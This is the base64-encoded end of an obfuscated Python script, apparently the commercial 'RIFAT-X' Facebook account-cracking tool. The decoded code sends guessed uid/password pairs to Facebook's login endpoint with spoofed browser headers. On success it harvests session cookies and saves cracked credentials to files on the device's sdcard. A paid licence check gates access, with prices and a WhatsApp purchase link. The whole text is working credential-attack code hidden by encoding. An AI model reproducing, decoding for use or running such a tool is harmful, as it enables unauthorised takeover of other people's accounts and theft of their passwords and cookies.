ZSI6ICdlbi1VUyxlbjtxPTAuOScsDQogICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICduby1jYWNoZSwgbm8tc3RvcmUsIG11c3QtcmV2YWxpZGF0ZScsDQogICAgICAgICAgICAicmVmZXJlciI6ICdodHRwczovL3AuZmFjZWJvb2suY29tLycsDQogICAgICAgICAgICAic2VjLWNoLXVhIjogJyJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLA0KICAgICAgICAgICAgInNlYy1jaC11YS1tb2JpbGUiOiAnPzEnLA0KICAgICAgICAgICAgInNlYy1jaC11YS1wbGF0Zm9ybSI6ICJXaW5kb3dzIiwNCiAgICAgICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ICdlbXB0eScsDQogICAgICAgICAgICAic2VjLWZldGNoLW1vZGUiOiAnY29ycycsDQogICAgICAgICAgICAic2VjLWZldGNoLXNpdGUiOiAnc2FtZS1vcmlnaW4nLA0KICAgICAgICAgICAgInNlYy1mZXRjaC11c2VyIjogJz8wJywNCiAgICAgICAgICAgICJwcmFnbWEiOiAnbm8tY2FjaGUnLA0KICAgICAgICAgICAgInByaW9yaXR5IjogJ3U9MCcsDQogICAgICAgICAgICAnY3Jvc3Mtb3JpZ2luLXJlc291cmNlLXBvbGljeSc6ICdjcm9zcy1vcmlnaW4nLA0KICAgICAgICAgICAgInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiAnMScsDQogICAgICAgICAgICAidXNlci1hZ2VudCI6IHByb30NCiAgICAgICAgICAgIGxvID0gc2Vzc2lvbi5wb3N0KCdodHRwczovL3AuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9sb2dpbi9hc3luYy8/cmVmc3JjPWRlcHJlY2F0ZWQmbHd2PTEwMCcsZGF0YT1sb2dfZGF0YSxoZWFkZXJzPWhlYWRlcl9mcmVlZmIpLnRleHQNCiAgICAgICAgICAgIGxvZ19jb29raWVzPXNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLmtleXMoKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbNzoyMl0NCiAgICAgICAgICAgICAgICBwcmludCgnXHJcclwwMzNbMTszMm0gW+GlrPCfmIjhrYRSSUZBVC1YIPCfmIjhrYTqk6fZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOl2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5rZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk5fZnNmc2ZzZnNmc2ZzZnNmc6pOw2ZzZnNmc2Zzqk6PZnC1PS/CfkoldICcgK2NpZCsgJyB8ICcgK3BzKyAgICAnICBcbiBcMDMzWzE7MzNtQ29va2llIPCfjao9IFwwMzNbMTszMm0nK2Nva2krICAnICAnJyAgXDAzM1swOzk3bScpDQogICAgICAgICAgICAgICAgY2VrX2FwayhzZXNzaW9uLGNva2kpDQogICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC/hpazwn5iI4a2EUklGQVQtWCDwn5iI4a2E6pOn2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTpdmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOa2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOX2ZzZnNmc2ZzZnNmc2ZzZnOqTsNmc2ZzZnNmc6pOj2ZwtT0sudHh0JywgJ2EnKS53cml0ZSggdWlkKycgfCAnK3BzKydcbicpDQogICAgICAgICAgICAgICAgb2tzLmFwcGVuZChjaWQpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIGxvZ19jb29raWVzOg0KICAgICAgICAgICAgICAgIGNva2k9IjsiLmpvaW4oW2tleSsiPSIrdmFsdWUgZm9yIGtleSx2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpXSkNCiAgICAgICAgICAgICAgICBjaWQgPSBjb2tpWzI0OjM5XQ0KICAgICAgICAgICAgICAgICNwcmludCgnXHJcclwzM1sxOzMxbSBb4aWs8J+YiOGthFJJRkFULVgg8J+YiOGthOqTp9mc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk6XZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTmtmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTl9mc2ZzZnNmc2ZzZnNmc2Zzqk7DZnNmc2ZzZnOqTo9mcLUNQ8J+SlF0gJyArdWlkKyAnIHwgJyArcHMrICAgICAgICAgICAnICBcMzNbMDs5N20nKQ0KICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQv4aWs8J+YiOGthFJJRkFULVgg8J+YiOGthOqTp9mc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2Zzqk6XZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTmtmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTl9mc2ZzZnNmc2ZzZnNmc2Zzqk7DZnNmc2ZzZnOqTo9mcLUNQLnR4dCcsICdhJykud3JpdGUoIHVpZCsnIHwgJytwcysnIFxuJykNCiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBsb29wKz0xDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcclxyJXMge3h9W3t4cn3hpazwn5iI4a2EUklGQVQtWCDwn5iI4a2E6pOn2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnOqTpdmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOa2ZzZnNmc2ZzZnNmc2ZzZnNmc2ZzZnNmc6pOX2ZzZnNmc2ZzZnNmc2ZzZnOqTsNmc2ZzZnNmc6pOj2Zwge3h9XVslc3wlc11bT0s6e3hyfSVze3h9XSclKEgsbG9vcCx0bCxsZW4ob2tzKSkpLA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICBleGNlcHQ6DQogICAgICAgIHBhc3MNCg0KDQpkZWYgYXBwcm92YWwoKToNCiAgb3Muc3lzdGVtKCdjbGVhcicpDQogIHByaW50KGxvZ28pDQogIHV1aWQgPSBzdHIob3MuZ2V0ZXVpZCgpKSArIHN0cihvcy5nZXRsb2dpbigpKQ0KICBpZCA9ICItIi5qb2luKHV1aWQpDQogIHRyeToNCiAgICBodHRwQ2FodCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9naXRodWIuY29tL3JlZmF0NTAwMS9BUFJPQkFMLUNPTlRPTC9ibG9iL21haW4vbXVubmEudHh0JykudGV4dA0KICAgIGlmIGlkIGluIGh0dHBDYWh0Og0KICAgICAgcHJpbnQoIlwzM1sxOzMybVlvdXIgVG9rZW4gaXMgU3VjY2Vzc2Z1bGx5IEFwcHJvdmVkIikNCiAgICAgIG1zZyA9IHN0cihvcy5nZXRldWlkKCkpDQogICAgICB0aW1lLnNsZWVwKDAuNSkNCiAgICAgIHh4cigpDQogICAgICBwYXNzDQogICAgZWxzZToNCiAgICAgIHByaW50KCJZb3VyIFRva2VuIDogIitpZCkNCiAgICAgIHByaW50KCdcMzNbMTszN20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykNCiAgICAgIHByaW50KCJcMzNbMTszMm1JbXBvcnRhbnQgTm90ZSIpDQogICAgICBwcmludCgiXDMzWzE7MzdtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIpDQogICAgICBwcmludCgiXDMzWzE7MzdtRm9yIDE1IERheXMgQXBwcm92YWwgUHJpY2UgNDAwICBPbmUgTW9udGggUHJpY2UiKQ0KICAgICAgcHJpbnQoJzYwMCBFYXN5cGFpc2EgWWEgS2Fpc2UgQmUgQWNjIHN5IHBheW1lbnQga2FyIGthJykNCiAgICAgIHByaW50KCdQYXkga2kgc3MgYWRtaW4ga28gc2VudCBrYXJhIGZyZWUgd2FsYSBkb29yIHJhaG9vJykNCiAgICAgIHByaW50KCdcMzNbMTszN20tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykNCiAgICAgIHByaW50ICgnSUYgVSBET05UIFdBTlQgVE8gQlVZIFBMUyBET05UIFBSRVNTIEVOVEVSJykNCiAgICAgIGlucHV0KCdJRiBVIFdBTlQgVE8gQlVZIFRIRU4gUFJFU1MgRU5URVIgJykNCiAgICAgIHRrcyA9ICgnSGVsbG8lMjBTaXIlMjAhJTIwUGxlYXNlJTIwQXBwcm92ZSUyME15JTIwVG9rZW4lMjBUaGUlMjBUb2tlbiUyMElzJTIwOiUyMCcraWQpO29zLnN5c3RlbSgnYW0gc3RhcnQgaHR0cHM6Ly93YS5tZS8rODgwMTMxNzI0NzE3OD90ZXh0PScrdGtzKSxhcHByb3ZhbCgpDQogICAgICB0aW1lLnNsZWVwKDEpDQogICAgICBhcHByb3ZhbCgpDQogIGV4Y2VwdDoNCiAgICBzeXMuZXhpdCgpDQoNCg0KDQphcHByb3ZhbCgp"))
